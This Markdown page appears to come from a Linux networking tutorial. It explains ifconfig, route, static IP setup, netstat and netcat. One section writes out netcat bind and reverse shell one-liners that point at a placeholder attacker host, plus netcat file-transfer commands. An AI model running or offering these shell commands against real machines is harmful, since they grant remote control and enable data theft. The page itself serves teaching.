---
description: "Networking in Linux is a vast topic, but I will explain some of the most commonly used networking commands that are fundamental to managing network configurations and troubleshooting network issues in Linux systems."
---

# Networking

Networking in Linux is a vast topic, but I will explain some of the most commonly used networking commands that are fundamental to managing network configurations and troubleshooting network issues in Linux systems.

1. **`ifconfig`**: This command is used to configure, control, and query TCP/IP network interface parameters from a command-line interface (CLI). It allows you to view and change the configuration of the network interfaces on your system. For example, `ifconfig eth0 up` will activate the `eth0` network interface.
2. **`route`**: This command is used to view and manipulate the IP routing table in the Linux kernel. It can be used to add, delete or modify routes to specific network destinations. For example, `route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1` will add a route to the network `192.168.1.0/24` via the gateway `192.168.1.1`.
3. **Static IP Address Configuration**: To set a static IP address in Linux, you need to edit the `/etc/network/interfaces` file. This file contains all the network interface configuration information for your system. Here's an example of how to configure a static IP:

   ```text
   auto eth0
   iface eth0 inet static
   address 192.168.1.100
   netmask 255.255.255.0
   gateway 192.168.1.1
   dns-nameservers 8.8.8.8 8.8.4.4
   ```

   This configuration sets a static IP address, subnet mask, default gateway, and DNS servers for the `eth0` interface.
4. **`netstat -antp`**: This command displays all active TCP connections and the TCP and UDP ports on which the computer is listening. The flags used here mean: `-a` (all sockets), `-n` (show numerical addresses instead of trying to determine symbolic host, port or user names), `-t` (TCP connections), and `-p` (show the PID and name of the program to which each socket belongs).
5. **`nc` or `netcat`**: This utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Netcat is also a feature-rich network debugging and exploration tool.

   For example, `nc -l 1234` would listen on port `1234` for incoming connections.
6. **Netcat Shells Like Bind and Reverse**: These are more advanced uses of netcat. A bind shell listens on a specific port on the target machine and awaits incoming connections. A reverse shell connects from the target machine back to an attacker's machine, which is listening for the connection.
   * **Bind Shell**: `nc -lvp 4444 -e /bin/bash` would set up a listener on port `4444` that executes `/bin/bash`, effectively giving a shell to anyone who connects.
   * **Reverse Shell**: On the target machine: `nc -e /bin/bash attacker_ip 4444`, and on the attacker's machine: `nc -lvp 4444`.
7. **File Transferring Techniques**: Netcat can also be used to transfer files between computers.

   * **Send file**: `nc -w 3 [destination] [port] < [filename]`
   * **Receive file**: `nc -l -p [port] > [filename]`

   This transfers `[filename]` from a local machine to a remote machine listening on `[port]`.
8. **`/etc/network/interfaces`**: This is the default configuration file for network interfaces on Debian and Ubuntu systems. It allows you to configure aspects such as static IP addresses, DHCP settings, and network interface names.

These commands form the basis of network management on Linux and are powerful tools for system administrators. Always ensure you have the correct permissions and are authorized to make changes to network configurations before executing these commands.

## In this section

* ✅ [Netcat](netcat.md)
